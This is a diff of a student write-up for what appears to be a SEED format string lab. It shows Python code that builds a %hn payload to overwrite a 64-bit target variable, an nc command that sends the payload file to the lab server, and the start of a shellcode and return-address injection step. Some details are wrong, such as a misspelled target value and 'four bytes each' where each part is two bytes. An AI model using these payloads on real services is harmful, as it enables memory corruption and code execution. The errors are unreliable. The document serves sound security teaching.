@@ -342,13 +342,7 @@ cat badfile | nc -w2 10.9.0.5 9090
 
 #### Changing the value to 0xAABBCCDD.
 
-This sub-task is similar to the previous one, except
-that the target value is now a large number. In a format string attack, this value is the total number of
-characters that are printed out by the printf() function; printing out this large number of characters
-may take hours. You need to use a faster approach. The basic idea is to use %hn or %hhn, instead of
-%n, so we can modify a two-byte (or one-byte) memory space, instead of four bytes. Printing out 2
-16
-characters does not take much time. More details can be found in the SEED book.
+In this task, the target value is a large number. This value is the total number of characters that are printed out by the printf() function; printing out this large number of characters may take hours. A faster approach is to use %hn or %hhn, instead of %n, so we can modify a two-byte (or one-byte) memory space, instead of four bytes.
 
 ##### Using %hn
 
@@ -445,6 +439,7 @@ with open('badfile', 'wb') as f:
 ```
 
 As we can see, the result is the same.
+
 **image**
 
 
@@ -814,5 +809,91 @@ with open('badfile', 'wb') as f:
 **image**
 
 
+#### Modifying the Target Value to 0xAAAABBBBCCCCDDDD
+
+The objective of this task is to modify the value of the target variable that is defined in the server program. If this target variable holds an important value that can affect the control flow of the program; attackers can change the behavior of the program if they can modify this value. We know that the memory address of the target variable is 0x0000555555558010.
+
+I will be using %hn to modify the target address 2-bytes at a time. I am going to place 0xAAAABBBBCCCCCDDDD into 0x0000555555558010 two bytes at a time
+
+Our program is a 64-bit program so our address is a 8-byte address. Our machine is little-endian, so we break `0xAAAABBBBCCCCCDDDD` into four parts with four bytes each.
+- 0x0000555555558010   <= 0xDDDD
+- 0x0000555555558012   <= 0xCCCC
+- 0x0000555555558014   <= 0xBBBB
+- 0x0000555555558016   <= 0xAAAA
+
+The values written are cummulative, so when constructing our string, we have to start with the addresses that will store lower values.
+
+For this task, I need to determine the total number of characters I would need to print for each precision modifier.
+- 0xAAAA = 43690
+- 0xBBBB = 48059
+- 0xCCCC = 52428
+- 0xDDDD = 56797
+- The offset is 34; the string will start with the four format specifiers for the four addresses we want to write into
+  - 34 + 4 = 38
+  - however, we have to take into consideration that we are dealing with a 64-bit program. This means each address is 8-bytes and we have to format our specifiers in such a way that they take up 8-bytes of memory space
+  - This leads us to 34 + 4 * 2 = 42
+- Now we have to determine the %x specifier that will be used for the addresses. The lowest number is 0xAAAA, so this will start.
+  - 0xAAAA = 43690
+- The next address will store a higher value which is 0xBBBB.
+  - 0xBBBB - 0xAAAA = 4369
+- The next address will store a higher value which is 0xCCCC.
+  - 0xCCCC - 0xBBBB = 4369
+- The next address will store a higher value which is 0xDDDD.
+  - 0xDDDD - 0xCCCC = 4369
+
+```python
+#!/usr/bin/python3
+import sys
+
+target = 0x0000555555558010
+t1     = 0x0000555555558016    # <= 0xAAAA
+t2     = 0x0000555555558014    # <= 0xBBBB
+t3     = 0x0000555555558012    # <= 0xCCCC
+t4     = target                # <= 0xDDDD
+
+# Create format string
+# I padded zeros to keep the lenght at 16-bytes
+content = ("%.0043690x%42$hn").encode('latin-1')
+content += ("%.0004369x%43$hn").encode('latin-1')
+content += ("%.0004369x%44$hn").encode('latin-1')
+content += ("%.0004369x%45$hn").encode('latin-1')
+
+content += (t1).to_bytes(8,byteorder='little')
+content += (t2).to_bytes(8,byteorder='little')
+content += (t3).to_bytes(8,byteorder='little')
+content += (t4).to_bytes(8,byteorder='little')
+
+# Append a newline
+content += ("\n").encode('latin-1')
 
 
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  print(f"writing {len(content)} bytes to badfile...")
+  f.write(content)
+```
+
+**image**
+
+
+#### Inject Malicious Code into the Server Program
+
+This task involves injecting a piece of malicious code, in its binary format, into the server’s memory, and then use the format string vulnerability to modify the return address field of a function, so when the function returns, it jumps to our injected code.
+
+In order to inject malicious code into the server program, we would need to modify the value that is stored in the return address of the function we are exploiting. This lab has been designed in such a way that when the program runs, it prints out certain values for the student.
+
+We would be needing two values:
+
+the frame-pointer address inside the vulnerable function
+the input buffer's address
+From the information the server prints out, we can determine these values to be:
+
+ffffd188 (frame-pointer address)
+ffffd260 (input buffer's address)
+When we build our attack string, it will consist of the following:
+
+the return address of the vulnerable function
+frame-pointer address + 4
+the memory address of our malicious code:
+the input buffer's address + (a value yet to be determined)
+the malicious code
